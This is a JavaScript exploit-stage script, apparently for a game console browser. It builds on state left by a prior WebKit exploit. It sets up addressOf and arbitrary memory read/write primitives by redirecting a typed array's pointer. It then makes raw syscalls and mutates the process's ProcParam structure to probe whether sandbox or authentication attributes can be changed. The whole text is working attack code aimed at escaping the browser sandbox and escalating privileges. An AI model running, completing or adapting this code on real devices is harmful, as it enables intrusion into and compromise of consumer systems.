// ProcParam Oracle Mutator: 598 = dynlib_get_proc_param (canonical
// name), so the ORBIS-signed root page is the browser's kernel-visible
// ProcParam. Question: does any 14.00 kernel path re-read ProcParam
// lazily, so a userland write to it changes syscall-visible process
// attributes? Protocol: derive root via 598 (fresh, ASLR-safe),
// validate layout (ORBI magic + the 0x14008001 word at +0x10),
// snapshot 192 bytes, baseline the oracle set (585 is_in_sandbox=1,
// 606 is_development_mode=0, 607 get_self_auth_info, 600 sandbox_path),
// write-gate the root page with an identical-value 8-byte write, then
// four mutation cycles: mutate -> oracle set -> restore -> verify.
// m1/m2: +0x10 u32 0x14008001 -> 0x00000000 / 0xFFFFFFFF.
// m3/m4: sub-struct targets of root+0x38 and root+0x48, first u32 -> 0.
// Oracle values ride in the markers (8 exactly) so a fatal mutation
// still banks the prior cycle. All writes identical-value-gated;
// process-local risk only.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number" ||
      typeof native.wrappers.sys585 !== "number" ||
      typeof native.wrappers.sys606 !== "number" ||
      typeof native.wrappers.sys607 !== "number" ||
      typeof native.wrappers.sys600 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(addressValue, bytes) {
    if (!Number.isSafeInteger(addressValue) ||
        addressValue % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("write_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function u32At(bytes, off) {
    return ((bytes[off]) | (bytes[off + 1] << 8) |
            (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) >>> 0;
  }
  function u64At(bytes, off) {
    return u32At(bytes, off) + u32At(bytes, off + 4) * 0x100000000;
  }
  function u32Bytes(value) {
    return [value & 255, (value >>> 8) & 255,
            (value >>> 16) & 255, (value >>> 24) & 255];
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("pp_preflight");
  // Step 1: derive root via 598
  phase = "call_598";
  var sizePtrOff = 0x1e00, bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  var errno598 = (call598.value === -1) ? native.readErrno() : null;
  fv.setUint32(sizePtrOff, sizeOrig, true);
  if (call598.value !== 0)
    throw new Error("call598_failed");
  var rootBase = fv.getUint32(bufOff + 4, true) * 0x100000000 +
    fv.getUint32(bufOff, true);
  if (rootBase < 0x1000 || rootBase >= 0x1000000000000 ||
      rootBase % 4096 !== 0)
    throw new Error("root_base_invalid");
  mark("pp_598ok");
  // Step 2: snapshot + layout validation
  phase = "snapshot";
  var snap = readAt(rootBase, 192);
  if (snap[8] !== 0x4f || snap[9] !== 0x52 ||
      snap[10] !== 0x42 || snap[11] !== 0x49)
    throw new Error("orbis_magic_missing");
  if (u32At(snap, 0x10) !== 0x14008001)
    throw new Error("param_word_mismatch");
  var orig10 = snap.slice(0x10, 0x18);
  var ss38 = u64At(snap, 0x38);
  var ss48 = u64At(snap, 0x48);
  if (ss38 % 8 !== 0 || ss48 % 8 !== 0)
    throw new Error("substruct_unaligned");
  var ss38orig = readAt(ss38, 8);
  var ss48orig = readAt(ss48, 8);
  mark("pp_snap_ok");
  // Oracle set: zero-arg calls, compact encoding
  function oracleSet() {
    var out = [];
    var names = ["sys585", "sys606", "sys607", "sys600"];
    for (var i = 0; i < names.length; i++) {
      var c = native.call(names[i], [0, 0, 0, 0, 0, 0]);
      var e = (c.value === -1) ? native.readErrno() : null;
      out.push(names[i].slice(3) + "=" + c.value +
        (e === null ? "" : "e" + e));
    }
    return out.join(";");
  }
  var lines = ["base:" + oracleSet()];
  // Step 3: identical-value write gate on the root page
  phase = "ro_gate";
  writeAt(rootBase + 0x10, orig10);
  var gatePid = native.call("getpid", []);
  if (gatePid.high !== 0 || gatePid.value !== before.value)
    throw new Error("ro_gate_killed_page");
  if (!same(readAt(rootBase + 0x10, 8), orig10))
    throw new Error("ro_gate_readback_mismatch");
  mark("pp_ro_ok");
  // Mutation cycle helper
  function cycle(tag, target, writeBytes, checkTarget, checkBytes) {
    phase = tag;
    writeAt(target, writeBytes);
    var ov = oracleSet();
    mark("pp_" + tag + ":" + ov.slice(0, 120));
    writeAt(target, checkBytes);
    if (!same(readAt(checkTarget, 8), checkBytes))
      throw new Error("restore_failed_" + tag);
    lines.push(tag + "(" + ov + ")");
  }
  // m1/m2: +0x10 u32 mutations (high half preserved)
  var m1bytes = orig10.slice(0, 4).concat(u32Bytes(0x00000000));
  cycle("m1", rootBase + 0x10, m1bytes, rootBase + 0x10, orig10);
  var m2bytes = orig10.slice(0, 4).concat(u32Bytes(0xffffffff));
  cycle("m2", rootBase + 0x10, m2bytes, rootBase + 0x10, orig10);
  // m3/m4: sub-struct first u32 -> 0
  var ss38zero = [0, 0, 0, 0].concat(ss38orig.slice(4, 8));
  cycle("m3", ss38, ss38zero, ss38, ss38orig);
  var ss48zero = [0, 0, 0, 0].concat(ss48orig.slice(4, 8));
  cycle("m4", ss48, ss48zero, ss48, ss48orig);
  // Final verification
  var finalSnap = readAt(rootBase, 192);
  var restored = true;
  for (var v = 0; v < 192; v++)
    if (finalSnap[v] !== snap[v]) { restored = false; break; }
  var after = native.call("getpid", []);
  mark("pp_done");
  result = { id: "procparam_mutate_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { root_base: rootBase.toString(16),
      lines: lines.join(" | ").slice(0, 480),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "procparam_mutate_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
